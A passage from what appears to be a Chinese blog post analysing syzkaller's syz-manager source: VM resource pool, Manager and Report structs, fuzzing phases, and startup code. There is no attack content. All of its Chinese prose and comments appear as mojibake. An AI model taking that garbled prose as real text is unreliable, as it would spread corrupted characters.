cfg.Mem &lt; <span class="hljs-number">128</span> || cfg.Mem &gt; <span class="hljs-number">1048576</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;bad qemu mem: %v, want [128-1048576]&quot;</span>, cfg.Mem)<br>&#125;<br>cfg.Kernel = osutil.Abs(cfg.Kernel)<br>cfg.Initrd = osutil.Abs(cfg.Initrd)<br><br>output, err := osutil.RunCmd(time.Minute, <span class="hljs-string">&quot;&quot;</span>, cfg.Qemu, <span class="hljs-string">&quot;--version&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>version := <span class="hljs-type">string</span>(bytes.Split(output, []<span class="hljs-type">byte</span>&#123;<span class="hljs-string">&#x27;\n&#x27;</span>&#125;)[<span class="hljs-number">0</span>])<br><br>pool := &amp;Pool&#123;<br>env:        env,<br>cfg:        cfg,<br>version:    version,<br>target:     targets.Get(env.OS, env.Arch),<br>archConfig: archConfig,<br>&#125;<br><span class="hljs-keyword">return</span> pool, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-ResourcePoolï¼šVM-èµ„æºæ± é˜Ÿåˆ—"><a href="#5-ResourcePoolï¼šVM-èµ„æºæ± é˜Ÿåˆ—" class="headerlink" title="5. ResourcePoolï¼šVM èµ„æºæ± é˜Ÿåˆ—"></a>5. ResourcePoolï¼šVM èµ„æºæ± é˜Ÿåˆ—</h3><p>Guest VM çš„èµ„æºè°ƒé…ä¸»è¦æ˜¯é€šè¿‡<code>ResourcePool</code> è¿™ä¸€ç»“æ„æ¥å®Œæˆçš„ï¼Œè¿™å®é™…ä¸Šæ˜¯ä¸€ä¸ª <strong>å­˜æ”¾ç©ºé—² VM ã® idx çš„å•å‘é˜Ÿåˆ—ï¼Œå†³å®šäº† VM çš„è°ƒåº¦é¡ºåº</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ResourcePool <span class="hljs-keyword">struct</span> &#123;<br>ids   []<span class="hljs-type">int</span><br>mu    sync.RWMutex<br>Freed <span class="hljs-keyword">chan</span> <span class="hljs-keyword">interface</span>&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸»è¦å®šä¹‰äº†è¿™äº›æ–¹æ³•æ¥æ“çºµèµ„æºæ± é˜Ÿåˆ—ï¼š</p><ul><li><code>Put()</code> ï¼šå‘é˜Ÿåˆ—æœ«å°¾æ·»åŠ ç©ºé—² VM ã® idx</li><li><code>Len()</code> ï¼šè·å–é˜Ÿåˆ—é•¿åº¦</li><li><code>Take()</code>ï¼šä»é˜Ÿåˆ—é¦–éƒ¨å–å‡º <code>cnt</code> ä¸ªæˆå‘˜</li><li><code>TakeOne()</code> ï¼šä»é˜Ÿåˆ—é¦–éƒ¨å–å‡ºå•ä¸ªæˆå‘˜</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Put(ids ...<span class="hljs-type">int</span>) &#123;<br>pool.mu.Lock()<br><span class="hljs-keyword">defer</span> pool.mu.Unlock()<br>pool.ids = <span class="hljs-built_in">append</span>(pool.ids, ids...)<br><span class="hljs-comment">// Notify the listener.</span><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> pool.Freed &lt;- <span class="hljs-literal">true</span>:<br><span class="hljs-keyword">default</span>:<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Len() <span class="hljs-type">int</span> &#123;<br>pool.mu.RLock()<br><span class="hljs-keyword">defer</span> pool.mu.RUnlock()<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(pool.ids)<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Take(cnt <span class="hljs-type">int</span>) []<span class="hljs-type">int</span> &#123;<br>pool.mu.Lock()<br><span class="hljs-keyword">defer</span> pool.mu.Unlock()<br>totalItems := <span class="hljs-built_in">len</span>(pool.ids)<br><span class="hljs-keyword">if</span> totalItems &lt; cnt &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>ret := <span class="hljs-built_in">append</span>([]<span class="hljs-type">int</span>&#123;&#125;, pool.ids[totalItems-cnt:]...)<br>pool.ids = pool.ids[:totalItems-cnt]<br><span class="hljs-keyword">return</span> ret<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> TakeOne() *<span class="hljs-type">int</span> &#123;<br>ret := pool.Take(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> ret == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">return</span> &amp;ret[<span class="hljs-number">0</span>]<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒæ—¶æœ‰ä¸€ä¸ª <code>SequentialResourcePool()</code> å‡½æ•°ç”¨ä»¥åˆå§‹åŒ–èµ„æºæ± ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SequentialResourcePool</span><span class="hljs-params">(count <span class="hljs-type">int</span>, delay time.Duration)</span></span> *ResourcePool &#123;<br>ret := &amp;ResourcePool&#123;Freed: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">interface</span>&#123;&#125;, <span class="hljs-number">1</span>)&#125;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; count; i++ &#123;<br>ret.Put(i)<br>time.Sleep(delay)<br>&#125;<br>&#125;()<br><span class="hljs-keyword">return</span> ret<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å…¨å±€ç®¡æ§ç›¸å…³"><a href="#å…¨å±€ç®¡æ§ç›¸å…³" class="headerlink" title="å…¨å±€ç®¡æ§ç›¸å…³"></a>å…¨å±€ç®¡æ§ç›¸å…³</h2><h3 id="1-Managerï¼šåŸºæœ¬ä¿¡æ¯"><a href="#1-Managerï¼šåŸºæœ¬ä¿¡æ¯" class="headerlink" title="1. Managerï¼šåŸºæœ¬ä¿¡æ¯"></a>1. Managerï¼šåŸºæœ¬ä¿¡æ¯</h3><p><code>Manager</code> ç»“æ„ä½“ç”¨äº<strong>è¡¨ç¤ºä¸€ä¸ª syz-manager çš„åŸºæœ¬ä¿¡æ¯</strong>ï¼Œå®šä¹‰äº <code>syz-manager/manager.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Manager <span class="hljs-keyword">struct</span> &#123;<br>cfg            *mgrconfig.Config<br>vmPool         *vm.Pool<br>target         *prog.Target<br>sysTarget      *targets.Target<br>reporter       *report.Reporter<br>crashdir       <span class="hljs-type">string</span><br>serv           *RPCServer<br>corpusDB       *db.DB<br>startTime      time.Time<br>firstConnect   time.Time<br>fuzzingTime    time.Duration<br>stats          *Stats<br>crashTypes     <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>vmStop         <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br>checkResult    *rpctype.CheckArgs<br>fresh          <span class="hljs-type">bool</span><br>numFuzzing     <span class="hljs-type">uint32</span><br>numReproducing <span class="hljs-type">uint32</span><br><br>dash *dashapi.Dashboard<br><br>mu                    sync.Mutex<br>phase                 <span class="hljs-type">int</span><br>targetEnabledSyscalls <span class="hljs-keyword">map</span>[*prog.Syscall]<span class="hljs-type">bool</span><br><br>candidates       []rpctype.Candidate <span class="hljs-comment">// untriaged inputs from corpus and hub</span><br>disabledHashes   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>&#123;&#125;<br>corpus           <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]CorpusItem<br>seeds            [][]<span class="hljs-type">byte</span><br>newRepros        [][]<span class="hljs-type">byte</span><br>lastMinCorpus    <span class="hljs-type">int</span><br>memoryLeakFrames <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>dataRaceFrames   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>saturatedCalls   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br><br>needMoreRepros <span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br>hubReproQueue  <span class="hljs-keyword">chan</span> *Crash<br>reproRequest   <span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br><br><span class="hljs-comment">// For checking that files that we are using are not changing under us.</span><br><span class="hljs-comment">// Maps file name to modification time.</span><br>usedFiles <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]time.Time<br><br>modules            []host.KernelModule<br>coverFilter        <span class="hljs-keyword">map</span>[<span class="hljs-type">uint32</span>]<span class="hljs-type">uint32</span><br>coverFilterBitmap  []<span class="hljs-type">byte</span><br>modulesInitialized <span class="hljs-type">bool</span><br><br>assetStorage *asset.Storage<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåªè¯´æ˜æ¯”è¾ƒå…³é”®çš„å‡ ä¸ªå­—æ®µï¼š</p><ul><li><code>cfg</code>ï¼šåŸºæœ¬è®¾ç½®ä¿¡æ¯ï¼Œå¯¹åº”å­˜æ”¾åœ¨ä¸€ä¸ª json æ–‡ä»¶ä¸­</li><li><code>vmPool</code> ï¼šæ‰€ç”¨çš„ VM Pool</li><li><code>reporter</code>ï¼šç”¨ä»¥æŠ¥å‘Š crash</li><li><code>serv</code> ï¼šRPC Serverï¼Œç”¨ä»¥ä¸ Guest é—´é€šä¿¡</li><li><code>corpusDB</code>ï¼šå­˜æ”¾è¯­æ–™çš„æ•°æ®åº“</li><li><code>targetEnabledSyscalls</code>ï¼šæµ‹è¯•ç”¨ä¾‹æ‰€å…è®¸ä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨</li><li><code>candidates</code>ï¼šå¾…æ‰§è¡Œæµ‹è¯•ç”¨ä¾‹</li><li><code>corpus</code>ï¼šè¯­æ–™åº“</li><li><code>seeds</code>ï¼šç”¨æ¥å¯¹è¯­æ–™åº“å˜å¼‚çš„ç§å­</li></ul><h3 id="2-fuzzing-phase"><a href="#2-fuzzing-phase" class="headerlink" title="2. fuzzing phase"></a>2. fuzzing phase</h3><p><code>syz-manager</code> ä¸­å°† fuzzing æµç¨‹åˆ†ä¸ºå¦‚ä¸‹çš„ä¸åŒé˜¶æ®µï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br><span class="hljs-comment">// åˆšåˆšå¼€å§‹ï¼Œå•¥éƒ½æ²¡åš.</span><br>phaseInit = <span class="hljs-literal">iota</span><br><span class="hljs-comment">// åŠ è½½äº†è¯­æ–™åº“ä¸”æ£€æŸ¥äº†æœºå™¨.</span><br>phaseLoadedCorpus<br><span class="hljs-comment">// ä»è¯­æ–™åº“ä¸­åˆ†ç±»äº†æ‰€æœ‰è¾“å…¥.</span><br><span class="hljs-comment">// è¿™æ˜¯æˆ‘ä»¬å¼€å§‹æŸ¥è¯¢ hub ä¸æœ€å°åŒ–è¿ç»­è¯­æ–™åº“çš„æ—¶å€™.</span><br>phaseTriagedCorpus<br><span class="hljs-comment">// ç¬¬ä¸€ä¸ªè¯·æ±‚å‘é€åˆ°äº† hub.</span><br>phaseQueriedHub<br><span class="hljs-comment">// åˆ†ç±»æ‰€æœ‰æ¥è‡ª hub çš„æ–°è¾“å…¥.</span><br><span class="hljs-comment">// è¿™æ˜¯æˆ‘ä»¬å¼€å§‹å¤ç° crashes çš„æ—¶å€™.</span><br>phaseTriagedHub<br>)<br></code></pre></td></tr></table></figure><h2 id="Fuzzing-ç»“æœç›¸å…³"><a href="#Fuzzing-ç»“æœç›¸å…³" class="headerlink" title="Fuzzing ç»“æœç›¸å…³"></a>Fuzzing ç»“æœç›¸å…³</h2><h3 id="1-Crashï¼šè®°å½•-crash-ä¿¡æ¯"><a href="#1-Crashï¼šè®°å½•-crash-ä¿¡æ¯" class="headerlink" title="1. Crashï¼šè®°å½• crash ä¿¡æ¯"></a>1. Crashï¼šè®°å½• crash ä¿¡æ¯</h3><p><code>manager.go</code> ä¸­å®šä¹‰äº†<code>Crash</code> ç»“æ„ä½“ç”¨ä»¥è®°å½•äº§ç”Ÿ crash çš„ VMã€æœºå™¨ä¿¡æ¯ç­‰ï¼Œ<strong>çœŸæ­£çš„ crash ä¿¡æ¯ä¸»è¦å­˜æ”¾åœ¨ä¸€ä¸ª <code>Report</code> ç»“æ„ä½“ä¸­</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Crash <span class="hljs-keyword">struct</span> &#123;<br>vmIndex <span class="hljs-type">int</span><br>hub     <span class="hljs-type">bool</span> <span class="hljs-comment">// this crash was created based on a repro from hub</span><br>*report.Report<br>machineInfo []<span class="hljs-type">byte</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-Reportï¼šå•æ¬¡æ‰§è¡Œç»“æœæŠ¥å‘Š"><a href="#2-Reportï¼šå•æ¬¡æ‰§è¡Œç»“æœæŠ¥å‘Š" class="headerlink" title="2. Reportï¼šå•æ¬¡æ‰§è¡Œç»“æœæŠ¥å‘Š"></a>2. Reportï¼šå•æ¬¡æ‰§è¡Œç»“æœæŠ¥å‘Š</h3><p><code>pkg/report/rteport.go</code> ä¸­çš„ <code>Report</code> ç»“æ„ä½“ç”¨ä»¥è¡¨ç¤ºå•æ¬¡æ‰§è¡Œçš„ç»“æœï¼ŒåŒ…æ‹¬æ˜¯å¦äº§ç”Ÿäº† crashã€Oops çš„ä¿¡æ¯ç­‰ç­‰ï¼š</p><ul><li><p><code>Title</code>ï¼š<strong>Oops çš„ç¬¬ä¸€è¡Œæ–‡æœ¬ï¼Œç”¨æ¥æ ‡è¯†ç‰¹å®šç±»å‹çš„ crash</strong></p><blockquote><p>ä¾‹å¦‚ <code>BUG: unable to handle page fault for address: ffffffff81001619</code> è¿™æ ·çš„</p></blockquote></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Report <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// Title contains a representative description of the first oops.</span><br>Title <span class="hljs-type">string</span><br><span class="hljs-comment">// Alternative titles, used for better deduplication.</span><br><span class="hljs-comment">// If two crashes have a non-empty intersection of Title/AltTitles, they are considered the same bug.</span><br>AltTitles []<span class="hljs-type">string</span><br><span class="hljs-comment">// Bug type (e.g. hang, memory leak, etc).</span><br>Type Type<br><span class="hljs-comment">// The indicative function name.</span><br>Frame <span class="hljs-type">string</span><br><span class="hljs-comment">// Report contains whole oops text.</span><br>Report []<span class="hljs-type">byte</span><br><span class="hljs-comment">// Output contains whole raw console output as passed to Reporter.Parse.</span><br>Output []<span class="hljs-type">byte</span><br><span class="hljs-comment">// StartPos/EndPos denote region of output with oops message(s).</span><br>StartPos <span class="hljs-type">int</span><br>EndPos   <span class="hljs-type">int</span><br><span class="hljs-comment">// SkipPos is position in output where parsing for the next report should start.</span><br>SkipPos <span class="hljs-type">int</span><br><span class="hljs-comment">// Suppressed indicates whether the report should not be reported to user.</span><br>Suppressed <span class="hljs-type">bool</span><br><span class="hljs-comment">// Corrupted indicates whether the report is truncated of corrupted in some other way.</span><br>Corrupted <span class="hljs-type">bool</span><br><span class="hljs-comment">// CorruptedReason contains reason why the report is marked as corrupted.</span><br>CorruptedReason <span class="hljs-type">string</span><br><span class="hljs-comment">// Recipients is a list of RecipientInfo with Email, Display Name, and type.</span><br>Recipients vcs.Recipients<br><span class="hljs-comment">// GuiltyFile is the source file that we think is to blame for the crash  (filled in by Symbolize).</span><br>GuiltyFile <span class="hljs-type">string</span><br><span class="hljs-comment">// reportPrefixLen is length of additional prefix lines that we added before actual crash report.</span><br>reportPrefixLen <span class="hljs-type">int</span><br><span class="hljs-comment">// symbolized is set if the report is symbolized.</span><br>symbolized <span class="hljs-type">bool</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x02-main-ï¼šåŠ è½½é…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨-manager"><a href="#0x02-main-ï¼šåŠ è½½é…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨-manager" class="headerlink" title="0x02. main()ï¼šåŠ è½½é…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨ manager"></a>0x02. main()ï¼šåŠ è½½é…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨ manager</h1><p><code>syz-manager</code> çš„ <code>main()</code> å‡½æ•°å…¶å®æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯è½½å…¥é…ç½®æ–‡ä»¶ä¿¡æ¯å¹¶è°ƒç”¨ <code>RunManager()</code> ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> prog.GitRevision == <span class="hljs-string">&quot;&quot;</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;bad syz-manager build: build with make, run bin/syz-manager&quot;</span>)<br>&#125;<br>flag.Parse()<br>log.EnableLogCaching(<span class="hljs-number">1000</span>, <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">20</span>)<br>cfg, err := mgrconfig.LoadFile(*flagConfig)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br>RunManager(cfg)<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><del>ğŸ‘´å¯»æ€å¥½åƒæ²¡ä»€ä¹ˆå¥½è¯´çš„</del></p></blockquote><h1 id="0x03-RunManager-ï¼šè¿›è¡Œåˆå§‹åŒ–å·¥ä½œ"><a href="#0x03-RunManager-ï¼šè¿›è¡Œåˆå§‹åŒ–å·¥ä½œ" class="headerlink" title="0x03. RunManager()ï¼šè¿›è¡Œåˆå§‹åŒ–å·¥ä½œ"></a>0x03. RunManager()ï¼šè¿›è¡Œåˆå§‹åŒ–å·¥ä½œ</h1><h3 id="Step-1-åˆå§‹åŒ–-VM-Pool"><a href="#Step-1-åˆå§‹åŒ–-VM-Pool" class="headerlink" title="Step 1. åˆå§‹åŒ– VM Pool"></a>Step 1. åˆå§‹åŒ– VM Pool</h3><p>é¦–å…ˆæ˜¯åˆå§‹åŒ– VM Poolï¼Œè¿™é‡Œè°ƒç”¨äº† <code>vm/vm.go</code> ä¸­çš„ <code>Create()</code> æ¥å®Œæˆ VM pool çš„åˆ›å»º</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> vmPool *vm.Pool<br>   <span class="hljs-comment">// &quot;none&quot; ç±»å‹å¯¹äºè°ƒè¯•/å¼€å‘è€Œè¨€æ˜¯ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼Œmanager å¹¶ä¸ä¼šå¯åŠ¨ä»»ä½• VMï¼Œ</span><br>   <span class="hljs-comment">// ä½†ç›¸åº”çš„æ˜¯ä½ åº”å½“æ‰‹åŠ¨å¯åŠ¨ VM å¹¶åœ¨æ­¤å¯åŠ¨ syz-fuzzer.</span><br><span class="hljs-keyword">if</span> cfg.Type != <span class="hljs-string">&quot;none&quot;</span> &#123;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>vmPool, err = vm.Create(cfg, *flagDebug)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¸»è¦å°±æ˜¯è·å– VM ç±»å‹ã€å°è£…ä¸€ä¸ª Env ç»“æ„ä½“ã€è°ƒç”¨å¯¹åº”ç±»å‹ VM Pool çš„æ„é€ å‡½æ•°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Create åˆ›å»ºä¸€ä¸ªå¯ç”¨äºåˆ›å»ºç‹¬ç«‹ VMs çš„ VM pool.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Create</span><span class="hljs-params">(cfg *mgrconfig.Config, debug <span class="hljs-type">bool</span>)</span></span> (*Pool, <span class="hljs-type">error</span>) &#123;<br>typ, ok := vmimpl.Types[cfg.Type]<br><span class="hljs-keyword">if</span> !ok &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;unknown instance type &#x27;%v&#x27;&quot;</span>, cfg.Type)<br>&#125;<br>env := &amp;vmimpl.Env&#123;<br>Name:      cfg.Name,<br>OS:        cfg.TargetOS,<br>Arch:      cfg.TargetVMArch,<br>Workdir:   cfg.Workdir,<br>Image:     cfg.Image,<br>SSHKey:    cfg.SSHKey,<br>SSHUser:   cfg.SSHUser,<br>Timeouts:  cfg.Timeouts,<br>Debug:     debug,<br>Config:    cfg.VM,<br>KernelSrc: cfg.KernelSrc,<br>&#125;<br>impl, err := typ.Ctor(env)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> &amp;Pool&#123;<br>impl:     impl,<br>workdir:  env.Workdir,<br>template: cfg.WorkdirTemplate,<br>timeouts: cfg.Timeouts,<br>&#125;, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-2-åˆå§‹åŒ–-Managerï¼Œè½½å…¥è¯­æ–™åº“ï¼Œå»ºç«‹é€šä¿¡æœåŠ¡å™¨"><a href="#Step-2-åˆå§‹åŒ–-Managerï¼Œè½½å…¥è¯­æ–™åº“ï¼Œå»ºç«‹é€šä¿¡æœåŠ¡å™¨" class="headerlink" title="Step 2. åˆå§‹åŒ– Managerï¼Œè½½å…¥è¯­æ–™åº“ï¼Œå»ºç«‹é€šä¿¡æœåŠ¡å™¨"></a>Step 2. åˆå§‹åŒ– Managerï¼Œè½½å…¥è¯­æ–™åº“ï¼Œå»ºç«‹é€šä¿¡æœåŠ¡å™¨</h3><p>éšåä¼šåˆ›å»ºç”¨äºå­˜å‚¨ crash çš„æ–‡ä»¶å¤¹ä¸ä¸€ä¸ªæ–°çš„ Reporter å®ä¾‹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">crashdir := filepath.Join(cfg.Workdir, <span class="hljs-string">&quot;crashes&quot;</span>)<br>osutil.MkdirAll(crashdir)<br><br>reporter, err := report.NewReporter(cfg)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ›å»ºä¸€ä¸ªåŸºæœ¬çš„ Manager å®ä¾‹ï¼Œç„¶åæ˜¯å››æ­¥èµ°ï¼š</p><ul><li><p><code>preloadCorpus()</code>ï¼šæ£€æŸ¥ <code>corpus.db</code> æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼ˆè‹¥ä¸å­˜åœ¨åˆ™åˆ›å»ºï¼‰å¹¶è½½å…¥ <code>sys/è¦fuzzçš„OS/test</code> ç›®å½•ä¸‹çš„æµ‹è¯•ç”¨æ¨¡æ¿</p><blockquote><p>è¯­æ–™åº“è½½å…¥çš„æ¨¡æ¿æœ¬èº«ç±»ä¼¼äº syzlang æ–‡ä»¶ï¼Œä¾‹å¦‚ <code>sys/linux/pipe</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 